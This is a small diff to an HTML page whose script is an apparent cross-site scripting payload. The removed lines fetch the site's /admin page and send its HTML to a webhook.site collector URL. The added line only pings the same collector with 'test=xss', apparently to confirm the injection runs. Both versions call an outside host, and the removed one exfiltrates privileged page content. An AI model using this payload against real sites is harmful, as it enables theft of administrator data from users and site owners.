@@ -2,11 +2,7 @@
 <html>
   <body>
     <script>
-      fetch("/admin")
-        .then(res => res.text())
-        .then(html => {
-          fetch("https://webhook.site/2c201842-6cee-4010-a608-5cb766016586?dump=" + encodeURIComponent(html));
-        });
+      fetch("https://webhook.site/2c201842-6cee-4010-a608-5cb766016586?test=xss");
     </script>
   </body>
 </html>
